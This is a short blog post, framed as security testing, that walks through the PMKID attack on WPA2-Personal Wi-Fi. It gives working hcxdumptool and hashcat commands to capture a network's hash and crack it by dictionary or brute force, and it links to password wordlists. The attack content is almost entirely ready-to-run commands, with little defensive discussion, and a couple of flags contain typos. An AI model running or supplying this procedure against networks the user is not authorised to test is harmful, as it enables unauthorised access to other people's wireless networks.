---
title: Testing Wireless AP Security
date: 2019-01-22 08:56:08
tags: 
    - Wifi
    - Networking
    - Security
category: Networking
---

### Testing Wireless AP security

A new flaw in WPA2-Personal has been found which doesn't require capturing the 4-way handshake as in KRACK. Wifi adapter will need to be capable on monitor mode. 

WPA2-EAP is not affected.  


```bash
## Capture the packet
sudo hcxdumptool -o test.pcapng -i <interface logical name> --enable_status=1
```
```bash
# Kill network manager if warning shows
# warning: NetworkManager is running with pid 828
# warning: wpa_supplicant is running with pid 890
# >>> sudo kill 828 890
# To restart: sudo systemctl start NetworkManager

# Convert into suitable hashcat format
./hcxpcaptool -z test.16800 test.pcapng
```
```bash
# Dictionary attack with hashcat
hashcat -m 16800 -a 0 -w 2 -o outfile test.16800 rockyou.txt

# Bruteforce with hashcat
hashcat -m 16800 -a 3 -o oufile -session=brute test.16800 <guess mask>
```

### Password lists

Crack station: https://crackstation.net/files/crackstation-human-only.txt.gz

Seclists: https://github.com/danielmiessler/SecLists/tree/master/Passwords

Rockyou: http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
